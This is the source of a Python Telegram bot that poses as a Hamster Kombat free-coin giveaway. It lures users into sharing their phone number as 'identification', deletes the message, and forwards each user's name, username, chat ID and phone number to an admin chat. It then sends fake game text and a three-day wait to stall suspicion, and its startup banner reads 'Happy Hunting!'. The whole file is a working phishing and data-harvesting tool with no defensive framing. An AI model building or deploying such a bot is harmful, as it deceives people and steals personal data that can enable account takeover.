import logging
import os
import random
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
import importlib.util

# Define the path to config.py
config_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), '..', 'config.py')

# Load the configuration
spec = importlib.util.spec_from_file_location("config", config_path)
config = importlib.util.module_from_spec(spec)
spec.loader.exec_module(config)

API_TOKEN = config.TOKEN
ADMIN_CHAT_ID = config.CHATID

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# Handler for the start command
@dp.message_handler(commands=['start'])
async def on_start(message: types.Message):
    await message.answer("<b>🖐 Hello! This is a bot where you can get additional Hamster Kombat coins for registration!\n\n"
                         "Coins are given once every 5 days, the amount varies from 10,000 to 30,000 coins.\n\n"
                         "To start, go through the identification process /identification</b>", parse_mode="HTML")

# Handler for the identification command
@dp.message_handler(commands=['identification'])
async def on_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    button = types.KeyboardButton(text="✅ Confirm phone number", request_contact=True)
    keyboard.add(button)
    
    await message.answer("<b>Phone Number\n\n"
                         "You need to confirm your phone number to complete the identification in Hamster Kombat!.\n\n"
                         "To do this, press the button below.</b>", reply_markup=keyboard, parse_mode="HTML")

# Handler for receiving contact information
@dp.message_handler(content_types=[types.ContentType.CONTACT])
async def on_contact_received(message: types.Message):
    contact = message.contact
    await message.answer("You have been successfully identified.", reply_markup=types.ReplyKeyboardRemove())
    
    await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)

    # Send a message to the admin
    admin_message = (f"New contact received:\n"
                     f"Name: {contact.first_name}\n"
                     f"Username: {message.from_user.username}\n"
                     f"Chat ID: {contact.user_id}\n"
                     f"Phone number: {contact.phone_number}")
    await bot.send_message(chat_id=ADMIN_CHAT_ID, text=admin_message)

    # Send instructions to the user
    await bot.send_message(chat_id=message.chat.id, text=(
        "<b>Hello! Welcome to Hamster Kombat 🐹\n"
        "From now on, you are the director of a crypto exchange.\n"
        "Which one? Choose for yourself. Tap the screen, collect coins, build passive income, and develop"
        "your own income strategy.\n"
        "We will evaluate this during the token listing, the date of which you will find out very soon.\n"
        "Don't forget about your friends — invite them to the game and get even more coins together!\n\n"
        "P.S. You must wait 3 days to receive the first coins.</b>"
    ), parse_mode="HTML")

if __name__ == '__main__':
    print("[+] HK Bot has been started!\n[!] Happy Hunting!")
    executor.start_polling(dp, skip_updates=True)
